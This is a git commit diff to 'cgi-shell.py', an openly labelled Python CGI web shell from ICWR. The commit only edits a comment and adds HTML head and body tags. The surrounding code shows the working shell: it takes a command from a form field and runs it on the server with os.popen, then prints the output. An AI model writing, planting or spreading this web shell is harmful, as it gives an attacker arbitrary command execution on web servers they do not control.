da4be0007dd9c9d4de327aeed5f59a6acc5dc725
Afrizal F.A <42967700+Afrizall@users.noreply.github.com>
2019-09-17 09:09:13 +0700

    Update cgi-shell.py

--- cgi-shell.py
+++ cgi-shell.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # Python CGI Shell
-# Copyright (c)2019 - Afrizal F.A - ICWR
+# Coded By Afrizal F.A
 try:
     import cgitb; cgitb.enable()
 except:
@@ -13,7 +13,10 @@ cmd=param.getvalue("0")
 
 print("Content-type:text/html\r\n\r\n")
 print("<html>")
+print("<head>")
 print("<title>ICWR - Python CGI Shell</title>")
+print("</head>")
+print("<body>")
 print("<h1>ICWR - Python CGI Shell</h1>")
 print("""<form enctype=\"multipart/form-data\" method=\"post\">
 {WebShell} -> <input type=\"text\" name=\"0\">
@@ -23,3 +26,5 @@ if cmd :
     print("<pre>")
     print(os.popen(cmd).read().replace("<","").replace(">",""))
     print("</pre>")
+print("</body>")
+print("</html>")
